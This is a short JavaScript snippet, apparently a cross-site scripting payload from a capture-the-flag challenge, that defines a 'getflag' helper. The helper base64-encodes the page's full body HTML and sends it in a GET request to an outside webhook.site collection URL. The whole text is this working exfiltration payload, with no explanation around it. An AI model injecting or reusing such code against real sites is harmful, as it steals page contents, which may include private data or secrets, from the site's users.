function getflag(url){
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
getflag("https://webhook.site/82320b43-ca2b-4df3-b80c-6f943cf0cbbc/?a="+btoa(document.body.innerHTML));
